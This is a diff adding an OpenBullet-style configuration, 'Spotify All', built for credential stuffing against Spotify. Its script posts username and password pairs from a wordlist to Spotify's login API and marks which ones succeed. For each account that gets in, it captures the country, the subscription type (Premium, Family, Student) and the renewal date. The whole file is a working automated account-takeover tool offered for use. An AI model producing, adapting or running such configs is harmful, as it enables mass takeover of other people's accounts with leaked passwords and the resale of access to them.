@@ -1,0 +1,68 @@
+[SETTINGS]
+{
+  "Name": "Spotify All",
+  "SuggestedBots": 200,
+  "LastModified": "2019-05-30T18:10:24.8662002+02:00",
+  "AdditionalInfo": "Captures all",
+  "Author": "INFINITEY",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://accounts.spotify.com/en/login?continue=https:%2F%2Fwww.spotify.com%2Fus%2Faccount%2Foverview%2F" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "accounts" 
+  KEYCHAIN Retry OR 
+    KEY "429" 
+REQUEST POST "https://accounts.spotify.com/api/login" 
+  CONTENT "remember=true&username=<USER>&password=<PASS>&csrf_token=<COOKIES(csrf_token)>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  COOKIE "__bon: MHwwfC0xNDAxNTMwNDkzfC01ODg2NDI4MDcwNnwxfDF8MXwx" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "{\"displayName\":\"" 
+  KEYCHAIN Failure OR 
+    KEY "{\"error\":\"errorInvalidCredentials\"}" 
+REQUEST GET "https://www.spotify.com/us/account/overview/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "Spotify Free" 
+    KEY "alert alert-warning alert-subscription" 
+PARSE "<SOURCE>" LR "profile-country\">" "</p></div></" -> CAP "Country" 
+PARSE "<SOURCE>" LR "subscription \" id=\"\"><h3 class=\"product-name\">" "</h3><p" -> VAR "Sub" 
+PARSE "<SOURCE>" LR "recurring-date\">" "</b>" -> CAP "Renew" 
+FUNCTION Replace "<span class=\"icon-checkmark-wrap\"><svg><use xlink:href=\"#icon-checkmark\"></use></svg></span>" "" "<Sub>" -> VAR "Types" 
+FUNCTION Translate 
+  KEY "Spotify Premium" VALUE "Premium" 
+  KEY "Premium for Family" VALUE "Family" 
+  KEY "Premium for Students" VALUE "Student" 
+  KEY "Spotify Premium with Hulu" VALUE "Premium+Hulu" 
+  "<Types>" -> CAP "Type" 
